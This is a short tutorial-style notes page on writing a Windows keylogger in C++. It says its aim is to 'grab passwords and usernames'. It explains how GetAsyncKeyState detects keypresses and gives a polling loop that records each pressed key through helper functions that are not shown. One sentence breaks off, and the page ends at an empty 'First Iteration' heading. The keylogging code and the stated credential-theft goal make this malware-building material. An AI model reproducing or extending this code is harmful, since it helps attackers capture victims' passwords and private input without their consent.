**Title:** ILY - Keylogger
**Tags:** [[ILY - Easy]]
**Topics:**

---
# ILY - Keylogger
# General
## startLogging()
Is not possible to know which key has been pressed after it happened, so the only way to know it is to check all possible valid keys in the ASCII symbols every time. Due to or goal, grab passwords and usernames, the last valid symbol is the "¡" that has the number 173.

Now that we are checking all the possible characters, its important to determine how are we going to get that "alarm" informing us that a key in the keyboard has been pressed.
Theres when the `GetAsyncKeyState()` comes in place.
`GetKeyState()` will return that a key has been pressed only if it happens in the same "instant", otherwise it will not detect it. This isn't really convinient in our case so we will use `GetAsyncKeyState()` instead, because it can retrieve the state of a key pressed at any time.

Its important to know how `GetAsyncKeyState()` works and which is the best way to implement it. You will see three types of implementations:
- `GetAsyncKeyState(key) == 0xFFFF8001` Verify if a key has been pressed and released.
- `GetAsyncKeyState(key) & 0x0001` Verify if a key has been pressed since the last call.
- `GetAsyncKeyState(key) & 0x8000` Verify if a key is actually pressed.
[//]: Note that (0xFFFF8001)Hexa == (-32767)Ca2
In our case, due the fact that is quite 

```c++
for (char key = 8; key<=173; key++) {
	if (GetAsyncKeyState(key) == 0xFFFF8001) {
	    if (not specialKey(key)) {
            string str(1, key);
            save(str);
        }
    }
}
```

# First Iteration